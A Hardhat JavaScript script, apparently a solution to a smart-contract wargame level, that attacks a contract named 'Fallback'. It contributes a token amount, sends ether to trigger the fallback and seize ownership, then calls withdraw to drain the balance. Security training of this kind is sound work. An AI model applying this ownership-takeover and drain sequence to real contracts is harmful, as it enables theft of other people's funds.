const { ethers } = require("hardhat")

const contractAddress = "0x72bFe7CF03FD498f8BbDc4A475c2080Eec680bae"
const contractName = "Fallback"

async function main() {
    let tx

    const [attacker] = await ethers.getSigners()
    const factory = await ethers.getContractFactory(contractName)
    const contract = factory.attach(contractAddress)

    console.log("Gotten all values player is" + attacker.address)

    // Contribute to appear in the `contributors` array
    tx = await contract.contribute({ value: 1 })
    await tx.wait()
    console.log("Just contributed")

    // Take ownership of the contract
    tx = await attacker.sendTransaction({
        to: contract.address,
        value: 1,
    })
    await tx.wait()
    console.log("Triggered Fallback")

    // Withdraw remaining eth
    tx = await contract.withdraw()
    await tx.wait()
    console.log("Tried to withdraw")

    console.log("DONE")
}

main().catch((error) => {
    console.error(error)
    process.exit(1)
})
